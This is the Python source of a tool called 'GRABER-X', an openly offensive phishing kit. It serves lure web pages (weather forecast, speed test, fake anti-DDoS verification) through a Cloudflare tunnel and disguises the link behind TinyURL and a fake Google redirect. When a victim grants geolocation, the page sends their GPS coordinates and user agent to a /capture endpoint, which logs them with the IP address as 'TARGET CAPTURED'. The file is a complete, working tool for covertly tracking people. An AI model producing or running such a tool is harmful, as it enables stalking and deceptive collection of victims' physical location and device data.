import os, sys, json, base64, time, subprocess, threading, re, random
from flask import Flask, render_template_string, request

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.align import Align
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.align import Align

console = Console()

LOG_FILE = "logs_graber_x.txt"
MY_TIKTOK = "https://www.tiktok.com/@archmodel57.wha?_r=1&_t=ZS-94uzsz9ny6x"
GITHUB_LINK = "https://github.com/Anonymous40443"
ACCESS_KEY = base64.b64decode("cHJveHk=").decode('utf-8')

LOCKED_ART = r"""
 [!] STATUS: SYSTEM_CRITICAL_LOCK
 [+] -------------------------------------- [+]
 [!]         IDENTIFICATION KEY             [!]
 [+] -------------------------------------- [+]
          
           .---.    [ WARNING ]
          /     \   UNAUTHORIZED ACCESS
          | (X) |   WILL BE LOGGED
          |  _  |   
      ____|_|_|_|____
     [_______________]
     |      [ ]      |
     |_______________|

 [+] -------------------------------------- [+]
 [?] PROVIDE TOKEN TO BYPASS ENCRYPTION...
"""

UNLOCKED_ART = r"""
 [+] SYSTEM BYPASS SUCCESSFUL...
 [+] WELCOME BACK, ELLIOT.

      __      __      [+] ------------------ [+]
     /  \    /  \     [!]  STORM-EYE ACTIVE  [!]
    /    \__/    \    [+] ------------------ [+]
   /  /\      /\  \   [!]  VIGILANTE MODE    [!]
  /  /  \____/  \  \  [+] ------------------ [+]
  \  \  /    \  /  /
   \  \/      \/  /
    \____/--\____/
"""

HAWK_MAIN = r"""
             ___
           MANAGEMENT
         /    ^    \
    ____/     |     \____
   /    \    / \    /    \
  /______\  /   \  /______\
          \/     \/
"""

TIGER_EXIT = [
r"""
     [bold magenta]       _,,..-''-..,,_ [/bold magenta]
     [bold magenta]    _,'              '._ [/bold magenta]
     [bold magenta]  ,'    _,,..-''-..,,_   '. [/bold magenta]
     [bold magenta] /   ,'                '.   \ [/bold magenta]
""",
r"""
     [bold red]  /   /  _      _   \   \ [/bold red]
     [bold red] |   |  (@)    (@)  |   | [/bold red]
     [bold red] |   |     ____     |   | [/bold red]
     [bold red]  \   \    \__/    /   / [/bold red]
""",
r"""
     [bold white]   \   '.        .'   / [/bold white]
     [bold white]    '.   '-....-'   .' [/bold white]
     [bold white]      '-._      _.-' [/bold white]
     [bold yellow]          `----` [/bold yellow]
"""
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def exit_animation():
    clear()
    for frame in TIGER_EXIT:
        console.print(Align.center(frame))
        time.sleep(0.3)
    console.print(Align.center("[bold red]SCRATCHING SYSTEM... TERMINATED.[/bold red]"))
    sys.exit()

def purple_spinner(text="INITIALIZING"):
    with Progress(SpinnerColumn(spinner_name="dots", style="bold purple"), TextColumn("[bold purple]{task.description}..."), BarColumn(bar_width=None, pulse_style="bold purple"), console=console) as progress:
        task = progress.add_task(text, total=None)
        time.sleep(3)

def loading(text="PROCESSING"):
    with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), BarColumn(bar_width=30, complete_style="red"), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
        task = progress.add_task(text, total=100)
        while not progress.finished:
            progress.update(task, advance=random.uniform(3, 9))
            time.sleep(0.03)

def check_access():
    clear()
    console.print(Align.center(f"[bold red]{LOCKED_ART}[/bold red]"))
    console.print("\n[bold red][?] TOKEN REQUIRED[/bold red]")
    pwd = input(" >> ").strip()
    if pwd == ACCESS_KEY:
        purple_spinner("BYPASSING ENCRYPTION")
        clear()
        console.print(Align.center(f"[bold green]{UNLOCKED_ART}[/bold green]"))
        time.sleep(1.5)
        return True
    else:
        console.print("[bold red][!] ACCESS DENIED.[/bold red]")
        sys.exit()

def get_masked_url(url):
    try:
        import requests
        res = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=10)
        if res.status_code == 200:
            short = res.text.strip()
            mask = "https://www.google.com/url?sa=t&source=web&url="
            return f"{mask}@{short.replace('https://', '')}"
        return url
    except:
        return url

app = Flask(__name__)

HTML_TPL = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title><style>body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;}
.box { border: 1px solid #0f0; padding: 40px; background: #050505; box-shadow: 0 0 20px #0f0; max-width: 400px; }
button { background: #0f0; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
</style></head><body><div class="box"><h1>{{ icon }}</h1><h2>{{ header }}</h2><p>{{ msg }}</p>
<button onclick="loc()">{{ btn }}</button></div>
<script>
function loc() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition((p) => { 
fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'}, 
body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}) }).then(() => { window.location.href = "{{ dest }}"; }); 
}, (e) => { alert("Verification Failed: Please enable GPS to bypass security."); }); } }
</script></body></html>
"""

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    ua = d.get('ua', 'Unknown')
    device = "Unknown Device"
    if "(" in ua:
        device = ua.split("(")[1].split(")")[0]
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    lat, lon = d.get('lat'), d.get('lon')
    maps = f"https://www.google.com/maps?q={lat},{lon}"
    
    console.print(Panel(f"[bold red]🎯 TARGET CAPTURED![/bold red]\n[white]📱 DEVICE: {device}\n🌐 IP: {ip}\n📍 GPS: {lat}, {lon}\n🗺️ MAPS: {maps}[/white]", border_style="bold red", title="ALERTA"))
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.ctime()} | Device: {device} | IP: {ip} | GPS: {lat},{lon}\n")
    return "OK"

@app.route('/')
def index():
    t = request.args.get('t', '4')
    dest = request.args.get('to') or MY_TIKTOK
    iscas = {
        '1': {"icon": "☁️", "title": "Weather", "header": "Local Weather", "msg": "Accept GPS to receive accurate weather forecast.", "btn": "VIEW WEATHER"},
        '2': {"icon": "📶", "title": "SpeedTest", "header": "Network Speed", "msg": "Check your connection speed in your region.", "btn": "START TEST"},
        '3': {"icon": "🛡️", "title": "DEFENDER", "header": "DDOS PROTECTION", "msg": "This page is protected against hacker attacks. Accept permissions to bypass DDOS filter.", "btn": "VERIFY IDENTITY"},
        '4': {"icon": "🔗", "title": "Redirect", "header": "Shortened Link", "msg": "Verify your location to access the destination link.", "btn": "CONTINUE"},
        '5': {"icon": "🔍", "title": "Search Optimizer", "header": "Content Search", "msg": "Aceite a localização para qualidade melhor na busca de conteúdo.", "btn": "OPTIMIZE SEARCH"}
    }
    return render_template_string(HTML_TPL, **iscas.get(t, iscas['4']), dest=dest)

def monitor(isca, dest, use_mask):
    console.print("\n[bold yellow][+] DEPLOYING TUNNEL...[/bold yellow]")
    # Pequeno tempo extra para garantir que o túnel esteja 100% online antes de ler o log
    time.sleep(3) 
    while True:
        if os.path.exists("cf.log"):
            with open("cf.log", "r") as f:
                log = f.read()
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", log)
            if match:
                raw_url = f"{match.group(0)}/?t={isca}&to={dest}"
                final_url = get_masked_url(raw_url) if use_mask else raw_url
                
                console.print("\n[bold white]============================================================[/bold white]")
                console.print(f"[bold green][+] FINAL URL:[/bold green] [bold white]{final_url}[/bold white]")
                console.print("[bold white]============================================================[/bold white]")
                
                console.print("\n[bold blink red][!] LISTENING FOR CONNECTIONS...[/bold blink red]")
                break
        time.sleep(1)

def menu():
    while True:
        clear()
        console.print(Align.center("[bold red] [+] G R A B E R - X  v12.7 [+] [/bold red]"))
        console.print(Align.center(f"[bold red]{HAWK_MAIN}[/bold red]"))
        console.print(Align.center("[bold red] [+] ----------------------- [+] [/bold red]"))
        console.print(Align.center(f"\n[bold blue]Created by Anonymous40443: {GITHUB_LINK}[/bold blue]\n"))
        
        m_table = Table(box=os.sys.modules['rich.table'].box.HEAVY, border_style="red", expand=True, show_header=False)
        m_table.add_column("ID", justify="center", style="bold cyan")
        m_table.add_column("CMD", style="white")
        m_table.add_row("01", "GENERATE STEALTH LINK")
        m_table.add_row("02", "INSTALL/START CLOUDFLARE (REQUIRED)")
        m_table.add_row("03", "VIEW CAPTURED DATABASE")
        m_table.add_row("04", "TERMINATE SESSION")
        console.print(m_table)
        
        console.print("\n[bold red]ESCOLHA[/bold red]")
        cmd = input(" >> ").strip()

        if cmd in ["1", "01"]:
            console.print("\n[bold red][?] REDIRECT TO (Enter for TikTok): [/bold red]")
            target = input(" >> ") or MY_TIKTOK
            console.print("\n[bold red][?] ACTIVATE URL MASKING? (y/n): [/bold red]")
            use_mask = input(" >> ").lower() == 'y'
            
            i_menu = Table(title="ENGINEERING MODELS", border_style="yellow", box=os.sys.modules['rich.table'].box.HEAVY)
            i_menu.add_column("ID", style="bold")
            i_menu.add_column("Model")
            i_menu.add_row("1", "Weather Forecast")
            i_menu.add_row("2", "Speed Test")
            i_menu.add_row("3", "DEFENDER (Anti-DDoS)")
            i_menu.add_row("4", "Direct Redirect")
            i_menu.add_row("5", "Content Search Optimizer")
            console.print(i_menu)
            
            console.print("\n[bold red][?] SELECT MODEL [1-5]: [/bold red]")
            isca = input(" >> ").strip() or "4"

            import logging
            logging.getLogger('werkzeug').setLevel(logging.ERROR)
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
            
            # Limpa log antigo para evitar erro de leitura
            if os.path.exists("cf.log"): os.remove("cf.log")
            
            with open("cf.log", "w") as f:
                subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=f, stderr=f)
            monitor(isca, target, use_mask)
            input("\n[PRESS ENTER TO RETURN]")
        
        elif cmd in ["2", "02"]:
            os.system("pkg update -y && pkg install cloudflared -y" if os.path.exists("/data/data/com.termux") else "wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && sudo dpkg -i cloudflared-linux-amd64.deb")
            console.print("[green][+] Done![/green]")
            time.sleep(1)
        
        elif cmd in ["3", "03"]:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    console.print(Panel(f.read(), title="DATABASE", border_style="blue"))
            input("\n[ENTER]")

        elif cmd in ["4", "04"]:
            exit_animation()

if __name__ == '__main__':
    if check_access():
        menu()
